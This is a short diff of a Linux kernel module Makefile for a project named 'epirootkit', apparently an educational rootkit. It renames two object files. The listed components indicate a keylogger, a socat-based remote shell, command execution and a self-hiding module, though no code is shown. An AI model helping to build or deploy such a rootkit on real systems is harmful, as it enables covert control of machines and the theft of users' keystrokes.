@@ -19,11 +19,11 @@ obj-m    := epirootkit.o
 
 epirootkit-objs :=                              \
     main.o                                      \
-    exec_cmd.o                                  \
+    exec.o                                      \
     socat.o                                     \
     file_ops.o                                  \
     epikeylog.o                                 \
-    rootkit_command.o                           \
+    cmd.o                                       \
     vanish.o                                    \
 	utils/crypto/hash.o                         \
 	utils/crypto/aes.o                          \
